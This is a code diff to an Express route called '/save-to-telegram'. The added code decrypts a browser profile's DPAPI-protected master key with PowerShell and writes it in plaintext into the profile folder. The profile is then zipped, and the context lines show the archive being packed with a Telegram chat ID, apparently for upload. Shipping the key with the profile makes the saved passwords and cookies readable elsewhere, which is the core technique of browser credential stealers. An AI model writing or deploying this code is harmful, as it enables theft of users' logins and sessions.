@@ -1069,6 +1069,31 @@ router.post('/save-to-telegram', async (req, res) => {
       }
 
       if (fs.existsSync(profileDir)) {
+        // Decrypt the DPAPI key and write it as plaintext dpapi_key.txt temporarily before zipping
+        const localStatePath = path.join(profileDir, 'Local State');
+        let tempKeyCreated = false;
+        if (fs.existsSync(localStatePath)) {
+          try {
+            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
+            const encryptedKeyBase64 = localState.os_crypt?.encrypted_key;
+            if (encryptedKeyBase64) {
+              const rawEncrypted = Buffer.from(encryptedKeyBase64, 'base64').slice(5);
+              const b64Input = rawEncrypted.toString('base64');
+              
+              const cp = require('child_process');
+              const psCommand = `Add-Type -AssemblyName System.Security; $bytes = [System.Convert]::FromBase64String('${b64Input}'); $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser); [System.Convert]::ToBase64String($dec);`;
+              
+              const decryptedB64 = cp.execSync(`powershell -NoProfile -Command "${psCommand}"`, { encoding: 'utf8' }).trim();
+              if (decryptedB64) {
+                fs.writeFileSync(path.join(profileDir, 'dpapi_key.txt'), decryptedB64, 'utf8');
+                tempKeyCreated = true;
+              }
+            }
+          } catch (dpapiErr) {
+            console.error('[DPAPI Export] Failed to decrypt key:', dpapiErr.message);
+          }
+        }
+
         const zip = new AdmZip();
         
         // Exclude Cache, Code Cache, GPUCache, Service Worker to keep the zip size small
@@ -1100,6 +1125,13 @@ router.post('/save-to-telegram', async (req, res) => {
         }
 
         const zipBuffer = zip.toBuffer();
+
+        // Delete the temporary plaintext key from disk immediately after zipping
+        if (tempKeyCreated) {
+          try {
+            fs.unlinkSync(path.join(profileDir, 'dpapi_key.txt'));
+          } catch (e) {}
+        }
 
         const formData = new FormData();
         formData.append('chat_id', String(chatId));
